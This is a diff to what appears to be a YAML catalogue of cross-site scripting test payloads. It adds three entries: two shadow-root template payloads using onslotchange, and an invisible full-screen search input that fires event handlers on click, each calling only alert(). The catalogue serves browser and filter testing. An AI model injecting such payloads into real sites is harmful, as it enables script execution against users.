@@ -9848,4 +9848,36 @@ payloads:
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "31-12-2025"
 
-  # Total payloads added: 455+
+  - code: |
+      <template shadowrootmode=open><slot onslotchange=alert( )>
+    description: "Template shadowroot mode XSS payload for DOM  manipulation"
+    category: "curated"
+    contributor: "Ademar Nowasky Junior"
+    github_username: "nowasky"
+    country: "Brazil"
+    tags: ["template", "shadowroot", "dom", "modern", "web-components", "curated"]
+    browsers: ["Chrome", "Safari", "Edge"]
+    date_added: "01-01-2026"
+
+  - code: |
+      <p>x<template shadowrootmode=open><slot onslotchange=alert( )>
+    description: "Template shadowroot mode XSS payload for DOM  manipulation with certain built-in tags"
+    category: "curated"
+    contributor: "Ademar Nowasky Junior"
+    github_username: "nowasky"
+    country: "Brazil"
+    tags: ["template", "shadowroot", "dom", "modern", "web-components", "curated"]
+    browsers: ["Chrome"]
+    date_added: "01-01-2026"
+
+  - code: |
+      <h1>Click here</h1>
+      <input type=search value=x onsearch=alert('onsearch') oninput=alert('oninput') style=position:fixed;left:50%;top:50%;padding:0;width:10px;z-index:99;transform:scale(9999);opacity:0>
+    description: "In Chrome, clicking the 'clear icon' on <input type=search> triggers onsearch and oninput"
+    category: "curated"
+    contributor: "Ademar Nowasky Junior"
+    github_username: "nowasky"
+    country: "Brazil"
+    tags: ["template", "onsearch", "dom", "modern", "web-components", "curated"]
+    browsers: ["Chrome"]
+    date_added: "01-01-2026"
